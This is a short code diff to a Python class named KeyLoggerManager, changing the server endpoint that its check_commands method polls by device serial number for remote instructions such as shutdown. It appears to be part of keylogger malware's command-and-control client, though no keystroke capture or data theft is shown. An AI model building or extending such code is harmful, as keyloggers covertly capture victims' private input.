@@ -46,7 +46,7 @@ class KeyLoggerManager(IKeyLoggerManager):
 
     def check_commands(self):
             try:
-                response = requests.get(f"{URL}/api/check_commands/{self.__serial_number}")
+                response = requests.get(f"{URL}/api/commands/{self.__serial_number}")
                 if response.status_code == 200:
                     commands = response.json().get('commands', {})
                     if commands.get('shutdown', False):
